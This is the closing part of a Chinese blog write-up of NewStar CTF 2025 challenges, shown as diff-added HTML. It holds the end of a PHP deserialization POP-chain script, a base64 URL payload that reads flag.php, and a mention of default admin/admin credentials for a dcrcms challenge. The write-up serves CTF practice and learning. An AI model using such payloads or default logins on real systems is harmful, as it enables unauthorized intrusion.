class="variable">$treasure</span>-&gt;door = <span class="variable">$end</span>;    <span class="comment">// Treasure-&gt;door 指向 endPoint</span></span><br><span class="line"><span class="variable">$treasure</span>-&gt;chest = <span class="variable">$treasure</span>; <span class="comment">// 自引用：chest 指向自己</span></span><br><span class="line"><span class="variable">$say</span>-&gt;sth = <span class="variable">$treasure</span>;     <span class="comment">// SaySomething-&gt;sth 指向 Treasure</span></span><br><span class="line"><span class="variable">$start</span>-&gt;direction = <span class="variable">$say</span>;  <span class="comment">// startPoint-&gt;direction 指向 SaySomething</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------</span></span><br><span class="line"><span class="comment">// 序列化并输出</span></span><br><span class="line"><span class="comment">// -----------------------------</span></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>);</span><br><span class="line"><span class="variable">$b64</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b64</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>?ma[ze.path&#x3D;TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NDoiZG9vciI7Tzo4OiJlbmRQb2ludCI6MTp7czo0OiJwYXRoIjtzOjg6ImZsYWcucGhwIjt9czo1OiJjaGVzdCI7cjozO319fQ&#x3D;&#x3D;</p>
+</blockquote>
+<h2 id="武功秘籍"><a href="#武功秘籍" class="headerlink" title="武功秘籍"></a><strong>武功秘籍</strong></h2><p>dcrcms,跟着网上文章复现即可。后台账号密码都为admin</p>
+<h1 id="Week5"><a href="#Week5" class="headerlink" title="Week5"></a>Week5</h1>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> NewStar CTF 2025复现</li>
+        <li><strong>作者:</strong> xhxbb</li>
+        <li><strong>创建于
+                :</strong> 2025-12-03 19:50:43</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-12-03 21:37:39
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://xhxbb1.github.io/2025/12/03/NewStar-CTF-2025复现/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/CTF/">#CTF</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/11/24/upload-lab-master/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">upload_lab_master</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'xhxbb1/xhxbb1.github.io',
+                'data-repo-id': 'R_kgDOPQRTkg',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDOPQRTks4CtcM8',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'bottom',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">NewStar CTF 2025复现</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Week1"><span class="nav-text">Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#multi-headach3"><span class="nav-text">multi-headach3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%87%E5%AE%99%E7%9A%84%E4%B8%AD%E5%BF%83%E6%98%AFphp"><span class="nav-text">宇宙的中心是php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%AB%E7%AC%91%E4%BD%A0%E4%B9%9F%E8%BF%87%E4%B8%8D%E4%BA%86%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="nav-text">别笑你也过不了第二关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E7%9C%9F%E5%BE%97%E6%8E%A7%E5%88%B6%E4%BD%A0%E4%BA%86"><span class="nav-text">我真得控制你了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E5%B0%8FW%E7%9A%84%E6%95%85%E4%BA%8B%EF%BC%881%EF%BC%89"><span class="nav-text">黑客小W的故事（1）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strange-login"><span class="nav-text">strange_login</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week2"><span class="nav-text">Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DD%E5%8A%A0%E9%80%9F%E5%99%A8"><span class="nav-text">DD加速器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E5%B8%BD%E5%B0%8FK%E7%9A%84%E6%95%85%E4%BA%8B%EF%BC%881%EF%BC%89"><span class="nav-text">白帽小K的故事（1）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%9F%E7%9A%84%E6%98%AF%E7%AD%BE%E5%88%B0%E8%AF%B6"><span class="nav-text">真的是签到诶</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%9E%E7%82%B9%E5%93%A6%E6%B6%A6%E5%90%89%E5%90%83%E5%90%83%E6%A9%98"><span class="nav-text">搞点哦润吉吃吃橘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F-E-%E7%9A%84%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="nav-text">小 E 的管理系统</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week3"><span class="nav-text">Week3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mygo"><span class="nav-text">mygo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mirror-gate"><span class="nav-text">mirror_gate</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8FE%E7%9A%84%E7%A7%98%E5%AF%86%E8%AE%A1%E5%88%92"><span class="nav-text">小E的秘密计划</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-clain"><span class="nav-text">ez_clain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#who%E2%80%99ssti"><span class="nav-text">who’ssti</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week4"><span class="nav-text">Week4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BE%8A%E8%B5%B0%E8%BF%B7%E5%AE%AB"><span class="nav-text">小羊走迷宫</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A6%E5%8A%9F%E7%A7%98%E7%B1%8D"><span class="nav-text">武功秘籍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week5"><span class="nav-text">Week5</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xhxbb</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 6 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+	<div id="aplayer"></div>
+
+<script src="/js/build/libs/APlayer.min.js"></script>
+
+
+<script src="/js/build/plugins/aplayer.js"></script>
+
+
+	
+</body>
+
+</html>
